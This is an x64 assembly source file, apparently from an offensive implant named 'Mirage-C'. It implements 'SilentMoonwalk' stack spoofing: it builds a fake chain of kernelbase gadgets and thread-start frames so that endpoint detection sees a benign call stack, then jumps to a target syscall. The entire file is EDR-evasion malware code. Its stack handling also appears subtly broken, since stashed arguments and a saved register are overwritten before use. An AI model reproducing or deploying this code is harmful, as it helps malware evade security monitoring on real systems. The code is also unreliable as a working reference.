; stack_spoof_stubs.asm - SilentMoonwalk stack spoofing for Mirage-C
; NASM x64, win64 ABI
;
; Builds synthetic call stack. EDR sees kernelbase gadgets ->
; RtlUserThreadStart -> BaseThreadInitThunk.
;
; spoof_call(cfg, target, a1..a11)
; We corrupt RBX (JMP[RBX] trick) - caller must not rely on it.

bits 64
default rel

section .text

global spoof_call

spoof_call:
    push rbp
    mov rbp, rsp
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15

    ; Save target, arg1, arg2
    mov r15, rdx            ; target
    mov r14, r8             ; arg1
    ; arg2 in R9

    ; Load cfg fields
    mov r10, [rcx]          ; jmp_rbx_gadget
    mov r11, [rcx + 8]      ; add_rsp_gadget
    mov r12, [rcx + 16]     ; rtl_user_thread_start
    mov r13, [rcx + 24]     ; base_thread_init_thunk

    ; Read args 3-11 from caller stack
    ; orig_rsp = rbp + 0x30
    mov r8,  [rbp + 0x58]   ; arg3
    mov rdi, [rbp + 0x60]   ; arg4
    mov rsi, [rbp + 0x68]   ; arg5
    mov rax, [rbp + 0x70]
    mov [rbp - 56], rax     ; stash arg6
    mov rax, [rbp + 0x78]
    mov [rbp - 64], rax     ; stash arg7
    mov rax, [rbp + 0x80]
    mov [rbp - 72], rax     ; stash arg8
    mov rax, [rbp + 0x88]
    mov [rbp - 80], rax     ; stash arg9
    mov rax, [rbp + 0x90]
    mov [rbp - 88], rax     ; stash arg10
    mov rax, [rbp + 0x98]
    mov [rbp - 96], rax     ; stash arg11

    ; Build fake return chain (5 slots = 0x28)
    sub rsp, 0x28
    mov [rsp + 0x00], r10   ; JMP[RBX] gadget
    mov [rsp + 0x08], r11   ; ADD_RSP gadget
    mov [rsp + 0x10], r12   ; RtlUserThreadStart
    mov [rsp + 0x18], r13   ; BaseThreadInitThunk
    mov rax, [rbp + 0x08]
    mov [rsp + 0x20], rax   ; real return

    lea rbx, [rsp + 0x08]   ; RBX -> fake[1]

    ; Setup target syscall args
    mov rcx, r14            ; arg1
    mov rdx, r9             ; arg2
    ; R8 = arg3 already
    mov r9, rdi             ; arg4
    mov [rsp + 0x28], rsi   ; arg5
    mov rax, [rbp - 56]
    mov [rsp + 0x30], rax   ; arg6
    mov rax, [rbp - 64]
    mov [rsp + 0x38], rax   ; arg7
    mov rax, [rbp - 72]
    mov [rsp + 0x40], rax   ; arg8
    mov rax, [rbp - 80]
    mov [rsp + 0x48], rax   ; arg9
    mov rax, [rbp - 88]
    mov [rsp + 0x50], rax   ; arg10
    mov rax, [rbp - 96]
    mov [rsp + 0x58], rax   ; arg11

    ; Save target to rax BEFORE restoring r15
    mov rax, r15

    ; Restore non-volatile (NOT rbx)
    mov r15, [rbp - 48]
    mov r14, [rbp - 40]
    mov r13, [rbp - 32]
    mov r12, [rbp - 24]
    mov rsi, [rbp - 16]
    mov rdi, [rbp - 8]
    mov rbp, [rbp]

    ; Tail-call target (saved in rax)
    jmp rax